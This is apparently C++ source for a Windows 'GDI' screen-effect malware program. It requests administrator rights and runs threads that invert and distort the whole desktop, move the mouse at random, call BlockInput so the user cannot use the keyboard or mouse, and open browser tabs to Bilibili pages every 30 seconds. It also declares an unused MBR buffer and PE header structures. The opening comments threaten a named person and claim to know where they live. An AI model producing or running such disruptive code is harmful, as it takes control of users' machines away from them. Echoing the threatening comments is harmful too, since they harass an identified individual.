//This GDI program was created by Tamsin-RTX on Bilibili. N17pro3726, I advise you to know your place.
//This is a formal warning to N173426 and all those who have plagiarized the GDI program. 
// I'm based in China and unable to access YouTube, but let me make this clear — N17pro3426 and everyone involved in copying GDI programs, 
// your plagiarism has reached China. N173426, don't pretend I'm unaware of how many GDI programs you've stolen. Don't think I don't know you're in Ukraine.
//This program was officially launched on November 5, 2026, and this rule took effect on the same day. 
// Let me warn you, if I find out you're copying my code, you won't like the consequences.

#define _CRT_SECURE_NO_WARNINGS
#define _USE_MATH_DEFINES
#include <windows.h>
#include <iostream>
#include <TlHelp32.h>
#include <Shlwapi.h>
#include <Psapi.h>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <atomic>
#include <vector>
#include <mmdeviceapi.h>
#include <audioclient.h>
#include <intrin.h>
#include <time.h>
#include <math.h>
#include <accctrl.h>
#include <fstream>
#include <climits>
#include <winternl.h>
#include <cstdio>
#include <cstdint>
#include <cstring>
#include <string>
#include <algorithm>
#include <experimental/filesystem>
#include <io.h>

#include "od.h"

namespace fs = std::experimental::filesystem;

#pragma comment(lib, "dwmapi.lib")
#pragma warning( disable: 4152 )
#pragma warning( disable: 4201 )
static HWND g_hwnd = NULL;

int Payload = 0;
int w = GetSystemMetrics(0);
int h = GetSystemMetrics(1);
struct Point3D {
	float x, y, z;
};
struct Point2D {
	float x, y, height;
};
struct Edge3D {
	Point3D PointA, PointB;
};
struct Edge2D {
	Point2D PointA, PointB;
};
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT v;
} HSV;


#define RGBQUAD _RGBQUAD
#define NUM_ACES 2
#pragma warning( push, 0 )
#pragma warning( pop )
#undef RGBQUAD

#include <aclapi.h>
#include <stdio.h>
#pragma region Public Variables
extern HWND hwndDesktop;
extern HDC hdcDesktop;
extern RECT rcScrBounds;
extern HHOOK hMsgHook;
extern INT nCounter;
#pragma endregion Public Variables
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:mainCRTStartup")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma once
#pragma warning( disable: 4152 )
#pragma warning( disable: 4201 )
#pragma comment(lib, "winmm.lib")
#pragma warning(default : 4146)
#pragma comment(linker, \
    "/manifestdependency:\"type='win32' " \
    "name='Microsoft.Windows.Common-Controls' " \
    "version='6.0.0.0' " \
    "processorArchitecture='*' " \
    "publicKeyToken='6595b64144ccf1df' " \
    "language='*'\"")

#pragma comment(linker, \
    "/MANIFESTUAC:\"level='requireAdministrator' uiAccess='false'\"")

#define RGBQUAD _RGBQUAD
#define BUFFER_SIZE 65536

#define LMIN 4
#define LMAX 32767
#define _DISK_PATH_LEN_ 32
#pragma warning( push, 0 )
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
#include <cmath>
#pragma comment(lib, "winmm.lib")
#define M_PI 3.14159265358979323846264338327950288
WCHAR myDir[MAX_PATH] = { 0 };
int red = 0;
int green = 0;
int blue = 0;
bool ifcolorblue = false;
bool ifblue = false;
int a, x, y, z;
struct ThreadParams {
	HDC dc;             // 绘图设备上下文
	int posX, posY;     // 位置
	int dx, dy;         // 移动速度
	float rotX, rotY, rotZ; // 旋转角度
	float rdx, rdy, rdz;    // 旋转速度
	int size;           // 模型大小
	int w, h;           // 屏幕/窗口宽高
	HICON* icon_list;   // 图标列表
	int icon_count;     // 图标数量
	volatile LONG* Payload; // 假设 Payload 是共享变量
};
COLORREF Hue(int length) {
	if (red != length) {
		// 修复：原代码 `red < length; red++;` 不是合法表达式，且无实际作用
		red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			// 修复：原代码 `green < length; green++;` 不是合法表达式，且无实际作用
			green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				// 修复：原代码 `blue < length; blue++;` 不是合法表达式，且无实际作用
				blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
	// 修复：确保所有路径都有返回值
	return RGB(red, green, blue);
}
int random() {
	return std::rand();
}
struct TriangleInfo
{
	POINT pts[3];
	COLORREF color;
};

static TriangleInfo g_triangle;
static CRITICAL_SECTION g_cs;

void RedrawScreen();

// 在文件合适位置实现 RedrawScreen 函数
void RedrawScreen()
{
	// 简单实现：强制刷新整个屏幕
	HWND hwndDesktop = GetDesktopWindow();
	HDC hdc = GetDC(hwndDesktop);
	if (hdc)
	{
		// 触发一次无效区域刷新
		InvalidateRect(hwndDesktop, NULL, TRUE);
		UpdateWindow(hwndDesktop);
		ReleaseDC(hwndDesktop, hdc);
	}
}
std::wstring generateRandomUnicodeString(int length);

std::wstring randomStr = generateRandomUnicodeString(rand() % 10 + 10);
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
WCHAR buffer[MAX_PATH] = { 0 };
BYTE MBR[512] = { 0 };

std::wstring generateRandomUnicodeString(int length) {
	std::wstring result;
	result.reserve(length);
	for (int i = 0; i < length; ++i) {
		// 生成可见的中日韩统一表意文字区间（0x4E00 ~ 0x9FA5）
		wchar_t ch = static_cast<wchar_t>(0x4E00 + rand() % (0x9FA5 - 0x4E00 + 1));
		result.push_back(ch);
	}
	return result;
}
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;
struct FlashInfo {
	HWND hWnd;
	int  maxCount;
	int  interval;
};
#pragma pack(push, 1)
struct MZHeader {
	uint16_t e_magic;
	uint16_t e_cblp;
	uint16_t e_cp;
	uint16_t e_crlc;
	uint16_t e_cparhdr;
	uint16_t e_minalloc;
	uint16_t e_maxalloc;
	uint16_t e_ss;
	uint16_t e_sp;
	uint16_t e_csum;
	uint16_t e_ip;
	uint16_t e_cs;
	uint16_t e_lfarlc;
	uint16_t e_ovno;
	uint16_t e_res[4];
	uint16_t e_oemid;
	uint16_t e_oeminfo;
	uint16_t e_res2[10];
	uint32_t e_lfanew;
};
#pragma pack(pop)
void GetRandomPath(WCHAR* buffer, int length) {
	// 用时间作为种子，保证每次运行生成的随机数不同
	srand((unsigned int)time(NULL));

	// Windows 临时文件常用的合法字符池
	const WCHAR charset[] = L"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

	for (int i = 0; i < length - 1; ++i) {
		buffer[i] = charset[rand() % (sizeof(charset) / sizeof(charset[0]) - 1)];
	}
	buffer[length - 1] = L'\0'; // 字符串结尾
}

using namespace std;
DWORD WINAPI MouseMoveThread(LPVOID lpParam) {
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	// 初始化随机数种子
	srand((unsigned int)time(0));

	// 无限循环，让鼠标随机移动
	while (true) {
		int x = rand() % screenWidth;   // 随机生成x坐标
		int y = rand() % screenHeight;  // 随机生成y坐标
		SetCursorPos(x, y);             // 设置鼠标位置
		Sleep(200);                     // 每次移动间隔100毫秒
	}

}
DWORD WINAPI curr2(LPVOID lpParam) {
	POINT cursor;
	while (1) {
		GetCursorPos(&cursor);
		int X = cursor.x + rand() % 3 - 1;
		int Y = cursor.y + rand() % 3 - 1;
		SetCursorPos(X, Y);
		BlockInput(true);
		Sleep(0);
	}
	return(1);
}
DWORD WINAPI drawEllipse(LPVOID lpParam)
{
	while (1) {
		HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
		INT y = GetSystemMetrics(0), x = GetSystemMetrics(1);
		BITMAPINFO bmi = { 0 };
		PRGBQUAD rgbScreen = { 0 };
		bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
		bmi.bmiHeader.biBitCount = 45;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biWidth = y;
		bmi.bmiHeader.biHeight = x;
		HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
		SelectObject(hdcMem, hbmTemp);
		StretchBlt(hdcScreen, -20, -20, y + 40, x + 40, hdcScreen, 0, 0, y, x, SRCCOPY);
		DrawIcon(hdcScreen, rand() % y, rand() % x, LoadCursor(0, IDC_ARROW));
		ReleaseDC(0, hdcScreen); DeleteDC(hdcScreen);
		Sleep(100);
	}
}
DWORD WINAPI shader1(LPVOID lpParam)
{
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	while (1) {
		desk = GetDC(0);
		for (float i = 0; i < sw + sh; i += 1.0f) {
			int a = sin(angle) * 12;
			BitBlt(desk, 0, i, sw, 1, desk, a, i, SRCINVERT);
			angle += M_PI / 80;
			DeleteObject(&i); DeleteObject(&a);
			DrawIcon(desk, rand() % sw, rand() % sh, LoadCursor(0, IDC_ARROW));
			Sleep(1);
		}
		ReleaseDC(wnd, desk);
	}
}
DWORD WINAPI shader2(LPVOID lpParam)
{
	int sw, sh;

	while (1) {
		HDC hdc = GetDC(0);
		sw = GetSystemMetrics(0);
		sh = GetSystemMetrics(1);
		StretchBlt(hdc, -20, -20, sw + 40, sh + 40, hdc, 0, 0, sw, sh, SRCINVERT);
		DrawIcon(hdc, rand() % sw, rand() % sh, LoadCursor(0, IDC_ARROW));
		ReleaseDC(0, hdc);
		Sleep(1);
	}
}
DWORD WINAPI shader3(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb *= x ^ y;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		Sleep(1);
	}
	DeleteObject(hbmTemp);
	DeleteDC(hdcMem);
	ReleaseDC(0, hdcScreen);
	return 0x00;
}
DWORD WINAPI shader4(LPVOID lpParam) {
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		POINT p[4] = { rand() % sw, rand() % sh, rand() % sw, rand() % sh,  rand() % sw, rand() % sh };
		HPEN hPen = CreatePen(PS_SOLID, 5, Hue(239));
		DeleteObject(hPen);
		ReleaseDC(0, hdc);
		Sleep(4);
	}
}
DWORD WINAPI sr200(LPVOID lpParam)
{
	HDC hdc = GetDC(0);
	int y = GetSystemMetrics(0), x = GetSystemMetrics(1);
	while (1) {
		BitBlt(hdc, rand() % 3, rand() % 2, y, x, hdc, 2, 3, SRCINVERT);
		ReleaseDC(0, hdc);
		Sleep(1500);
	}
}
DWORD WINAPI DrawThread(LPVOID lpParam)
{
	int angle = 0;
	while (true)
	{

		EnterCriticalSection(&g_cs);
		LeaveCriticalSection(&g_cs);

		InvalidateRect(g_hwnd, nullptr, FALSE);
		Sleep(44);
		angle++;
	}
	return 0;
}
DWORD WINAPI qr(LPVOID lpvd) {
	HDC hdc = GetDC(0);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	while (1) {
		DrawIconEx(hdc, rand() % w, rand() % h, LoadCursor(0, IDC_ARROW), 0, 0, 0, 0, DI_NORMAL);
		ReleaseDC(0, hdc);
		Sleep(1);
	}
}
DWORD WINAPI icons(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		int x = rand() % GetSystemMetrics(SM_CXSCREEN);
		int y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(hdc, x, y, LoadIcon(0, IDI_ERROR));
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		ReleaseDC(0, hdc);
		Sleep(2);
	}
}
DWORD WINAPI i07(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		DrawIcon(hdc, w, h, LoadIcon(0, IDI_APPLICATION));
		BitBlt(hdc, 0, 0, w, h, hdc, -90, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(180);
	}
}
DWORD WINAPI swirl(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), xSize = sh / 10, ySize = 9;
	while (1) {
		hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < sh * 2; i++) {
			int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdcMem, i, 0, 1, sh, hdcMem, i, wave, SRCCOPY);
		}
		for (int i = 0; i < sw * 2; i++) {
			int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdcMem, 0, i, sw, 1, hdcMem, wave, i, SRCCOPY);
		}
		BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);
		SelectObject(hdcMem, 0);
		DeleteDC(hdcMem);
		Sleep(300);
	}
	ReleaseDC(0, hdc);
}
DWORD WINAPI d(LPVOID lpParam)
{
	int sw, sh;

	while (1) {
		HDC hdc = GetDC(0);
		sw = GetSystemMetrics(0);
		sh = GetSystemMetrics(1);
		StretchBlt(hdc, -20, -20, sw + 40, sh + 40, hdc, 0, 0, sw, sh, SRCCOPY);
		DrawIcon(hdc, rand() % sw, rand() % sh, LoadCursor(0, IDC_ARROW));
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}
DWORD WINAPI shanmu(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; w * h > i; i++) {
			int x = i % w, y = i / h;
			data[i].rgb -= x & y;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		DeleteObject(hbm);
		DeleteDC(hdcdc);
		ReleaseDC(0, desk);
		Sleep(100);
	}
	return 0;
}
DWORD WINAPI shader5(LPVOID lpParam) {
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	while (1) {
		desk = GetDC(0);
		for (float i = 0; i < sw + sh; i += 0.8f) {
			int a = sin(angle) * 14;
			BitBlt(desk, 0, i, sw, 1, desk, a, i, SRCCOPY);
			angle += M_PI / 109;
			DeleteObject(&i); DeleteObject(&a);
		}
		ReleaseDC(0, desk);
		Sleep(20);
	}
}
DWORD WINAPI shader6(LPVOID lpParam) {
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
	PRGBTRIPLE rgbtriple;
	for (;;) {
		desk = GetDC(0);
		HDC hdcMem = CreateCompatibleDC(0);
		HBITMAP scr = CreateDIBSection(hdcMem, &bmi, 0, (void**)&rgbtriple, 0, 0);
		SelectObject(hdcMem, scr);
		BitBlt(hdcMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		for (int i = 0; i < sw * sh; i++) {
			int x = i % sw, y = i / sh;
			rgbtriple[i].rgbtRed += x & y;
			rgbtriple[i].rgbtGreen += x & y;
			rgbtriple[i].rgbtBlue += x & y;
		}
		BitBlt(desk, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(0, desk);
		DeleteDC(hdcMem);
		DeleteObject(scr);
		DeleteObject(rgbtriple);
		Sleep(200);
	}
}
DWORD WINAPI sr300(LPVOID lpParam) {
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	while (1) {
		desk = GetDC(0);
		DrawIcon(desk, rand() % sw, rand() % sh, LoadCursor(0, IDC_ARROW));
		Sleep(1);
		for (float i = 0; i < sw + sh; i += 0.99f) {
			int a = sin(angle) * 15;
			BitBlt(desk, 0, i, sw, 1, desk, a, i, SRCCOPY);
			angle += M_PI / 109;
			DeleteObject(&i); DeleteObject(&a);
		}
		ReleaseDC(0, desk);
		Sleep(40);
	}
}
DWORD WINAPI sr400(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while (1) {
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(1600);
	}
}
DWORD WINAPI sr500(LPVOID lpParam)
{
	HDC hdc = GetDC(0);
	int y = GetSystemMetrics(0), x = GetSystemMetrics(1);
	while (1) {
		BitBlt(hdc, rand() % 5, rand() % 5, y, x, hdc, 5, 5, SRCINVERT);
		ReleaseDC(0, hdc);
		Sleep(500);
	}
}
DWORD WINAPI sr600(LPVOID lpParam)
{
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	while (1) {
		desk = GetDC(0);
		for (float i = 0; i < sw + sh; i += 1.0f) {
			int a = sin(angle) * 12;
			BitBlt(desk, 0, i, sw, 1, desk, a, i, SRCINVERT);
			angle += M_PI / 80;
			DeleteObject(&i); DeleteObject(&a);
		}
		ReleaseDC(wnd, desk);
	}
}
DWORD WINAPI rd600(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = -h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	PRGBQUAD rgbquad = NULL;
	for (;;) {
		hdc = GetDC(NULL); HDC hdcCopy = CreateCompatibleDC(hdc);
		if (hdcCopy == NULL) { ReleaseDC(0, hdc); continue; }
		bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(hdcCopy, bmp);
		INT i = 0;
		while (1) {
			hdc = GetDC(NULL);
			StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
			for (int x = 0; x < w; x++) {
				for (int y = 0; y < h; y++) {
					int index = y * w + x;
					double fractalX = (10.0f / w);
					double fractalY = (1.90f / h);
					double cx = x * fractalX - 10.f;
					double cy = y * fractalY - 1.0f;
					double a = 0, b = 0; int i = 0;
					while (((a * a) + (b * b)) < 10 && i < 50) {
						double absA = fabs(a), absB = fabs(b);
						double aa = absA * absA - absB * absB + cx;
						double bb = 2 * absA * absB + cy;
						a = aa; b = bb;
						i++;
						rgbquad[index].rgb += i;
					}
				}
			}
			i++;
			StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCINVERT);
			Sleep(0);
		}
	}
	DeleteObject(bmp);
	ReleaseDC(0, hdc);
	return 0x00;
}
DWORD WINAPI rd300(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); int r = 2, g = 1, b = 4, power = 22;
	HDC hdc, hdcMem; HBITMAP hbm;
	for (int i = 0;; i++, i %= 3) {
		hdc = GetDC(0); hdcMem = CreateCompatibleDC(hdc); hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY); GetBitmapBits(hbm, w * h * 4, data);
		SetBitmapBits(hbm, w * h * 4, data); BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		Sleep(1);
	}
	ReleaseDC(0, hdc);
	DeleteDC(hdcMem);
	DeleteObject(&hbm);
	return 0x00;
}
DWORD WINAPI rd200(LPVOID lpParam)
{
	while (1)
	{
		ShellExecute(NULL, L"open", L"https://www.baidu.com", NULL, NULL, SW_SHOWNORMAL);
		ShellExecute(NULL, L"open", L"https://www.bilibili.com/", NULL, NULL, SW_SHOWNORMAL);
		ShellExecute(NULL, L"open", L"https://space.bilibili.com/3546581317978244?spm_id_from=333.1007.0.0", NULL, NULL, SW_SHOWNORMAL);
		Sleep(30000);
	}
	return 0;
}
DWORD WINAPI shader15(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0);
	HDC hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);

	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 32;

	PRGBQUAD rgbScreen = NULL;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, 0);
	HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMem, hbmTemp);

	for (;;) {
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			rgbScreen[i].r = min(255, rgbScreen[i].r + 30);
			rgbScreen[i].g = min(255, rgbScreen[i].g + 30);
			rgbScreen[i].b = min(255, rgbScreen[i].b + 30);
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		Sleep(30);
	}
	SelectObject(hdcMem, hbmOld);
	DeleteObject(hbmTemp);
	DeleteDC(hdcMem);
	ReleaseDC(0, hdcScreen);
	return 0x00;
}
HWND g_hWnd = NULL;
int  g_G = 255;
bool g_Run = true;
DWORD WINAPI FadeThread(LPVOID) {
	while (g_Run && g_G > 0) {
		g_G -= 2;                     // 每帧递减量，越大越快
		InvalidateRect(g_hWnd, NULL, FALSE);
		Sleep(100);                    // 帧间隔，越大越慢
	}
	return 0;
}
DWORD WINAPI balls(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	while (1) {
		HDC hdc = GetDC(0);
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 300 + x;
		int bottom_y = 300 + y;
		x += incrementor * signX;
		y += incrementor * signY;
		HBRUSH brush = CreateSolidBrush(Hue(239));
		SelectObject(hdc, brush);
		Ellipse(hdc, top_x, top_y, bottom_x, bottom_y);
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(350);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI sh(LPVOID lpParam) {
	HDC hdc = GetDC(HWND_DESKTOP);
	int X = GetSystemMetrics(SM_CXSCREEN);
	int Y = GetSystemMetrics(SM_CYSCREEN);

	while (TRUE)
	{
		HDC hdc = GetDC(HWND_DESKTOP);
		int sw = GetSystemMetrics(SM_CXSCREEN);
		int sh = GetSystemMetrics(SM_CYSCREEN);
		BitBlt(hdc, rand() % 10, rand() % 10, sw, sh, hdc, rand() % 10, rand() % 10, SRCINVERT);
		if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
		ReleaseDC(0, hdc);
		Sleep(1200);
	}
}
DWORD WINAPI d03(LPVOID lpParam) {
	HDC hdc = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	for (;;) {
		hdc = GetDC(0);
		for (float i = 0; i < sw + sh; i += 0.8f) {
			int a = sin(angle) * 4;
			BitBlt(hdc, i, 0, 1, sh, hdc, i, a, SRCCOPY);
			angle += M_PI / 118;
		}
		Sleep(6);
	}
	ReleaseDC(0, hdc);
	return 0x00;
}
DWORD WINAPI p34(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(30);
	}
}
DWORD WINAPI S(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	// 创建分层窗口
	HWND hwnd = CreateWindowEx(
		WS_EX_LAYERED | WS_EX_TOPMOST | WS_EX_TRANSPARENT,
		L"STATIC", NULL,
		WS_POPUP,
		0, 0, w, h,
		NULL, NULL, NULL, NULL
	);

	if (!hwnd) return 1;

	// 设置窗口为完全透明（alpha=0），这样窗口"看不见"但能绘制
	SetLayeredWindowAttributes(hwnd, 0, 0, LWA_ALPHA);

	HDC hdcScreen = GetDC(NULL);
	HDC hdcMem = CreateCompatibleDC(hdcScreen);
	HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, w, h);
	SelectObject(hdcMem, hbm);

	BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, AC_SRC_ALPHA };
	POINT ptZero = { 0, 0 };
	SIZE sizeWindow = { w, h };
	POINT ptSrc = { 0, 0 };

	while (1) {
		// 先复制屏幕到内存DC
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

		// 做你的偏移复制效果
		BitBlt(hdcMem, 0, 0, w, h, hdcMem, -30, 0, SRCCOPY);
		BitBlt(hdcMem, 0, 0, w, h, hdcMem, w - 30, 0, SRCCOPY);
		BitBlt(hdcMem, 0, 0, w, h, hdcMem, 0, -30, SRCCOPY);
		BitBlt(hdcMem, 0, 0, w, h, hdcMem, 0, h - 30, SRCCOPY);

		// 通过 UpdateLayeredWindow 把内存DC贴到分层窗口上
		UpdateLayeredWindow(hwnd, hdcScreen, &ptZero, &sizeWindow,
			hdcMem, &ptSrc, 0, &blend, ULW_ALPHA);

		Sleep(5);
	}

	DeleteObject(hbm);
	DeleteDC(hdcMem);
	ReleaseDC(NULL, hdcScreen);
	DestroyWindow(hwnd);
	return 0;
}
DWORD WINAPI d00(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		BitBlt(hdc, 0, 0, w, h, hdc, -90, 0, SRCINVERT);
		BitBlt(hdc, 0, 0, w, h, hdc, w - 90, 0, SRCINVERT);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, -90, SRCINVERT);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 90, SRCINVERT);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCINVERT);
		ReleaseDC(0, hdc);
		Sleep(30);
	}
}
DWORD WINAPI d10(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		BitBlt(hdc, 0, 0, w, h, hdc, 45, 0, SRCINVERT);
		BitBlt(hdc, 0, 0, w, h, hdc, w -45, 0, SRCINVERT);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 45, SRCINVERT);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, h -45, SRCINVERT);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCINVERT);
		ReleaseDC(0, hdc);
		Sleep(30);
	}
}
DWORD WINAPI system32(LPVOID lpParam)
{
	ShellExecuteA(NULL, "open", "taskmgr", NULL, NULL, SW_SHOW);
	Sleep(30000);
	return 0x00;
}
